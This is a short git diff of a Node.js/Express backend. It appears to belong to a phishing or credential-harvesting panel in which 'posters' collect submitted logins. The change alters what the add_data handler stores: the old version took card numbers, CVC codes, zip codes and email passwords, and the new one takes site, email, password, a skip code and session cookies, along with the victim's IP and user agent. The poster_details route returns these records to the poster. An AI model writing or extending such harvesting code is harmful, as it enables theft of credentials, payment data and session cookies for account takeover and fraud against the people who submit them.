@@ -397,7 +397,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard,wrongPassword,validity,address,cardNumber,cvc,name,zipCode } = req.body
+    const { site, email, password, skipcode,cookie  } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -625,7 +625,7 @@ export const poster_details =async  (req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword validity address cardNumber cvc name zipCode createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password ip agent cookie createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
